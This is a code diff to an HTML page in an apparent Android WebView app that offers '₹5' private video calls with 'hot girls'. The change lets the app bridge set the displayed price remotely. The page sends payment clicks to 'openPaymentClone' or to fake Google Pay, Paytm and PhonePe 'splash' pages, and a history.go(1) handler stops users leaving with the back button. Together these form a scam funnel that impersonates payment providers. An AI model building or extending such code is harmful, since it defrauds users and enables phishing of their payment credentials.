@@ -376,13 +376,13 @@
     <div class="premium-badge">⭐ Premium</div>
     
     <div class="header">
-      <div class="price">₹5 Only</div>
-      <div class="price-label">One-Time Payment</div>
+      <div class="price"><span data-price-amount>₹5</span> Only</div>
+      <div class="price-label" data-price-description>One-Time Payment</div>
     </div>
     
     <div class="offer-msg">
       <strong>🔥 Unlock Premium! 💋</strong>
-      Pay ₹5 for private 1-on-1 video calls with hot girls! 😘
+      Pay <span data-price-amount>₹5</span> for private 1-on-1 video calls with hot girls! 😘
     </div>
     
     <div class="features-list">
@@ -420,7 +420,13 @@
         </div>
       </div>
       
-      <button class="pay-btn" onclick="selectPaymentMethod('gpay')">💳 Pay ₹5</button>
+      <button
+        class="pay-btn"
+        onclick="selectPaymentMethod('gpay')"
+        data-price-button="💳 Pay {amount}"
+      >
+        💳 Pay ₹5
+      </button>
     </div>
     
     <div class="secure">
@@ -439,24 +445,59 @@
     window.onpopstate = function() {
       history.go(1);
     };
-    
+
+    function getPaymentAmount() {
+      try {
+        if (typeof Android !== 'undefined' && Android.getPaymentAmount) {
+          return Android.getPaymentAmount();
+        }
+      } catch (e) {}
+      return '₹5';
+    }
+
+    function getPaymentDescription() {
+      try {
+        if (typeof Android !== 'undefined' && Android.getPaymentDescription) {
+          return Android.getPaymentDescription();
+        }
+      } catch (e) {}
+      return 'One-Time Payment';
+    }
+
+    function syncPriceContent() {
+      const amount = getPaymentAmount();
+      const description = getPaymentDescription();
+      document.querySelectorAll('[data-price-amount]').forEach(function(el) {
+        el.textContent = amount;
+      });
+      document.querySelectorAll('[data-price-description]').forEach(function(el) {
+        el.textContent = description;
+      });
+      document.querySelectorAll('[data-price-button]').forEach(function(el) {
+        const template = el.getAttribute('data-price-button') || '{amount}';
+        el.textContent = template.replace('{amount}', amount);
+      });
+    }
+
+    syncPriceContent();
+
     function selectPaymentMethod(method) {
       try {
         if (typeof Android !== 'undefined' && Android.openPaymentClone) {
           Android.openPaymentClone(method);
-        } else {
-          if (method === 'gpay') {
-            window.location.href = 'googlepay-splash.html';
-          } else if (method === 'paytm') {
-            window.location.href = 'paytm-splash.html';
-          } else if (method === 'phonepe') {
-            window.location.href = 'phonepe-splash.html';
-          }
+          return;
         }
-      } catch (e) {
-        console.error('Error opening payment clone:', e);
+      } catch (e) {}
+
+      if (method === 'gpay') {
+        window.location.href = 'googlepay-splash.html';
+      } else if (method === 'paytm') {
+        window.location.href = 'paytm-splash.html';
+      } else if (method === 'phonepe') {
+        window.location.href = 'phonepe-splash.html';
       }
     }
   </script>
+
 </body>
 </html>
